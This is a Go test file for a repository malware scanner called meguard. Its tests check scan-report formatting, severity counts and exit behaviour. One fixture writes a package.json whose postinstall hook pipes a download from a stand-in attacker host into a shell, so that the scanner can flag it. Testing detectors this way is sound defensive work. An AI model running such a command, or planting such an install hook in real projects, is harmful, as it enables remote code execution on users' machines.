package cmd

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/IsraelGboluwaga/meguard/internal/analyze"
)

func TestPrintScanSectionNoFindings(t *testing.T) {
	var stdout, stderr bytes.Buffer
	printScanSection(&stdout, &stderr, analyze.Report{FilesScanned: 3, ASTDisabledReason: "needs a cgo build"})
	out := stdout.String()
	for _, want := range []string{
		"STATIC SCAN",
		"files scanned: 3",
		"AST analysis: disabled (needs a cgo build)",
		"findings: none",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("scan section missing %q\n  got:\n%s", want, out)
		}
	}
}

func TestPrintScanSectionWithFindings(t *testing.T) {
	var stdout, stderr bytes.Buffer
	report := analyze.Report{
		FilesScanned: 1,
		Findings: []analyze.Finding{
			{Analyzer: "regex", Severity: analyze.High, File: "a.js", Line: 3, Message: "matches something bad", Snippet: "eval(...)"},
		},
	}
	printScanSection(&stdout, &stderr, report)
	out := stdout.String()
	if !strings.Contains(out, "findings: 1 (1 high)") {
		t.Errorf("expected a findings summary line, got:\n%s", out)
	}
	if !strings.Contains(out, "a.js:3") {
		t.Errorf("expected the finding location, got:\n%s", out)
	}
	if !strings.Contains(out, "eval(...)") {
		t.Errorf("expected the finding snippet, got:\n%s", out)
	}
}

func TestPrintScanSectionWarningsGoToStderr(t *testing.T) {
	var stdout, stderr bytes.Buffer
	report := analyze.Report{Errors: []string{"a.js: permission denied"}}
	printScanSection(&stdout, &stderr, report)
	if !strings.Contains(stdout.String(), "scan warnings: 1") {
		t.Errorf("expected a warning count on stdout, got:\n%s", stdout.String())
	}
	if !strings.Contains(stderr.String(), "a.js: permission denied") {
		t.Errorf("expected the warning detail on stderr, got:\n%s", stderr.String())
	}
}

func TestHighCriticalCount(t *testing.T) {
	report := analyze.Report{Findings: []analyze.Finding{
		{Severity: analyze.Info},
		{Severity: analyze.Medium},
		{Severity: analyze.High},
		{Severity: analyze.Critical},
	}}
	if got := highCriticalCount(report); got != 2 {
		t.Errorf("highCriticalCount = %d, want 2", got)
	}
}

func TestPrintScanSummaryLine(t *testing.T) {
	tests := []struct {
		name    string
		scanned bool
		report  analyze.Report
		want    string
	}{
		{"skipped", false, analyze.Report{}, "static scan: skipped (--no-scan)"},
		{"clean", true, analyze.Report{}, "static scan: clean (0 findings"},
		{
			name:    "findings",
			scanned: true,
			report:  analyze.Report{Findings: []analyze.Finding{{Severity: analyze.High}}},
			want:    "static scan: 1 finding(s) (1 high)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			printScanSummaryLine(&buf, tt.scanned, tt.report)
			if out := buf.String(); !strings.Contains(out, tt.want) {
				t.Errorf("summary line = %q, want it to contain %q", out, tt.want)
			}
		})
	}
}

// TestRunScanExitsNonZeroOnHighFinding is an integration test for the
// container-less "meguard scan" path: a repo whose postinstall hook pipes a
// download into a shell must produce a High finding and a non-nil error, all
// without touching Docker.
func TestRunScanExitsNonZeroOnHighFinding(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"scripts": {"postinstall": "curl -sSL https://evil.example/i.sh | sh"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0o644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	err := runScan(context.Background(), dir, true, &stdout, &stderr)
	if err == nil {
		t.Fatal("expected a non-nil error for a High finding")
	}
	if !strings.Contains(stdout.String(), "STATIC SCAN") {
		t.Errorf("expected the STATIC SCAN section on stdout, got:\n%s", stdout.String())
	}
}

// TestRunScanCleanRepoSucceeds asserts a clean repo exits 0 (nil error).
func TestRunScanCleanRepoSucceeds(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "index.js"), []byte("console.log('hi');\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	if err := runScan(context.Background(), dir, false, &stdout, &stderr); err != nil {
		t.Errorf("expected a clean repo to succeed, got: %v", err)
	}
}

// TestPrintCompactScanSectionSummarizesRatherThanListing checks the default
// (non--verbose) scan report: it must show a status line and the pointer to
// -v, but not dump every finding the way printScanSection does.
func TestPrintCompactScanSectionSummarizesRatherThanListing(t *testing.T) {
	report := analyze.Report{
		FilesScanned: 5,
		Findings: []analyze.Finding{
			{Analyzer: "entropy", Category: "entropy", Severity: analyze.High, File: "a.ts", Line: 1, Message: "long line"},
			{Analyzer: "entropy", Category: "entropy", Severity: analyze.Medium, File: "src/components/ui/x.tsx", Line: 1, Message: "long line"},
			{Analyzer: "entropy", Category: "entropy", Severity: analyze.Medium, File: "src/components/ui/y.tsx", Line: 1, Message: "long line"},
		},
	}
	var stdout, stderr bytes.Buffer
	printCompactScanSection(&stdout, &stderr, report)
	out := stdout.String()
	if !strings.Contains(out, "3 finding(s) (1 high, 2 medium)") {
		t.Errorf("expected a compact status line, got:\n%s", out)
	}
	if !strings.Contains(out, "HIGH") || !strings.Contains(out, "a.ts:1") {
		t.Errorf("expected the High finding listed individually, got:\n%s", out)
	}
	if !strings.Contains(out, "... 2 more") || !strings.Contains(out, "meguard scan -v") {
		t.Errorf("expected the remaining findings rolled up with a pointer to -v, got:\n%s", out)
	}
	if strings.Contains(out, "src/components/ui/x.tsx") {
		t.Errorf("expected the rolled-up findings NOT to be listed individually, got:\n%s", out)
	}
}

// TestRestHintMostlyOneDirectory checks the "mostly <dir>/*" hint fires only
// when one directory accounts for a majority of the rolled-up findings, the
// shape a UI component library's own long class-name strings produces.
func TestRestHintMostlyOneDirectory(t *testing.T) {
	rest := []analyze.Finding{
		{Analyzer: "entropy", File: "src/components/ui/a.tsx"},
		{Analyzer: "entropy", File: "src/components/ui/b.tsx"},
		{Analyzer: "entropy", File: "src/components/ui/c.tsx"},
		{Analyzer: "regex", File: "src/contexts/AuthContext.tsx"},
	}
	got := restHint(rest)
	if !strings.Contains(got, "3 entropy") || !strings.Contains(got, "1 regex") {
		t.Errorf("expected analyzer counts in hint, got %q", got)
	}
	if !strings.Contains(got, "mostly src/components/ui/*") {
		t.Errorf("expected a majority-directory hint, got %q", got)
	}
}
